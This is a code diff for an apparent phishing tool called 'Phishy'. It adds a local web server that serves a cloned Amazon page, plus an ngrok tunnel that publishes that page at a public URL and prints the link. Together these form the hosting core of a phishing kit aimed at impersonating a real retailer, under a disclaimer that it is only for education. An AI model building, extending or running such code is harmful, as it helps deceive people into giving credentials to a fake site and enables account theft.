@@ -8,8 +8,9 @@ const ngrok = require('ngrok');
 const inquirer = require('inquirer');
 const { exec } = require('child_process');
 
-console.log(`
+const PORT = 8080;
 
+console.log(`
     :: Disclaimer: Developers assume no liability and are not ::
     :: responsible for any misuse or damage caused by Phishy. ::
     :: Only use for educational purposes!                     ::
@@ -26,6 +27,16 @@ console.log(`
         ██      ██   ██ ██      ██ ██   ██    ██    
         ██      ██   ██ ██ ███████ ██   ██    ██                                            
 `);
+
+
+const ngrokStart = async () => {
+    const url = await ngrok.connect({
+        proto: 'http',
+        addr: PORT
+    });
+    
+    return url;
+};
 
 inquirer
 	.prompt([
@@ -49,7 +60,17 @@ inquirer
 	.then((answer) => {
 		const ans = answer.website;
 
-		const website = ans.split(' ').join('').toLowerCase();
-
-		console.log(website);
+        const website = ans.split(' ').join('').toLowerCase();
+        
+        ngrokStart().then((url) => console.log(url))
 	});
+
+http.createServer((req, res) => {
+    fs.readFile(`./websites/amazon/index.html`, (err, data) => {
+        res.writeHead(200, {'Content-Type': 'text/html'});
+        res.write(data);
+        res.end();
+    })
+
+}).listen(PORT);
+
